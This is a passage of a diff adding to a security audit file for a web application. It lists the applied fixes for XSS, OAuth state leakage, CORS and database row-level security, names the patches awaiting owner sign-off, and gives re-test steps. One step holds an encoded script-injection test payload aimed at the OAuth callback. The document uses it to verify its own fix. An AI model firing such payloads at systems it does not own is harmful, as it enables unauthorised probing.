+5. **PATCH** `api/google-oauth-callback.js` — HTML-escape `error` query param (CRIT-3 fix).
+6. **PATCH** `api/google-oauth-start.js` — replace plaintext `state=ADMIN_TOKEN` with HMAC-signed ephemeral state + use `isAuthorized` for entry auth (CRIT-5 fix).
+7. **PATCH** `api/send-followup.js` — sign the roadmap URL (HIGH-6 fix).
+8. **PATCH** `api/resources.js` — replace `Origin: *` with the project allowlist (MED-9 fix).
+9. **NEW** `db/migrations/006_fix_agent_runs_schema.sql` — reconcile dual `agent_runs` definition (HIGH-3).
+10. **NEW** `db/migrations/007_rls_hardening.sql` — enable RLS + service_role policies on tables added in 003/004 (HIGH-7).
+
+Patches **not** applied yet (need owner sign-off, behavior-changing):
+- C2-2 admin `localStorage` → `sessionStorage` (changes admin UX: re-auth per tab).
+- C2-4 Turnstile (requires DNS + env var setup).
+- H2-1 email-change confirmation flow (changes portal UX + adds a new endpoint + new email).
+- H2-4 questionnaire booking_id required (potentially breaks legacy email links if any are in flight).
+- H2-8 distributed rate limiter (requires KV provisioning).
+- M2-12 nonce CSP (requires script audit across 22 HTML pages — pair with v1 M1 build pipeline).
+
+---
+
+## Re-test instructions for the patches above
+
+After deploying the patches:
+
+1. **Cron auth** — add `CRON_SECRET=$(openssl rand -hex 32)` to Vercel env (Production + Preview). Redeploy. Verify Vercel cron logs show `200` on `/api/reminders` and `/api/weekly-digest` (Vercel auto-attaches the Authorization header). `curl https://www.30dayramp.com/api/reminders` (no header) must return `401`.
+2. **OAuth callback XSS** — visit `/api/google-oauth-callback?error=%3Cscript%3Ealert(1)%3C%2Fscript%3E` — must render the literal `<script>` text in the `<pre>` block, not execute.
+3. **OAuth state hardening** — start the OAuth flow from the admin UI button. Verify (a) the URL Google receives no longer contains `ADMIN_TOKEN`, (b) the callback succeeds and shows the refresh token, (c) replaying the callback URL after 10 minutes returns `Invalid state`.
+4. **Admin querystring fallback** — `curl https://www.30dayramp.com/api/admin?token=$ADMIN_TOKEN` must return `401` (was `200`).
+5. **send-followup link** — trigger from admin, open the customer email, click "View your full roadmap →" — must load the roadmap (was 403).
+6. **RLS** — in Supabase SQL editor, switch role to `anon` and `select count(*) from portal_events;` — must return permission error.
+
+---
+
+*v2 audit complete — 2026-04-29. Author: Senior Security Architect engagement. Open issue count: 31. Patches landing this PR: 10. Patches needing sign-off: 6.*
+
+---
+---
+
+# v1 audit (preserved for context — 2026-04-27)
+
 **Audited at:** `aaff7ef` on `main` (2026-04-27, branch synced via `git pull origin main` — already up to date)
 **Scope:** all 18 HTML pages, `styles.css`, 22 API route files in `api/` (incl. `_lib/`), `vercel.json`, `db/migrations/`, `scripts/e2e-test.sh`, sitemap, robots, README.
 **Method:** read-only static analysis. No headless browser / Lighthouse run — recommendations are grounded in source review.
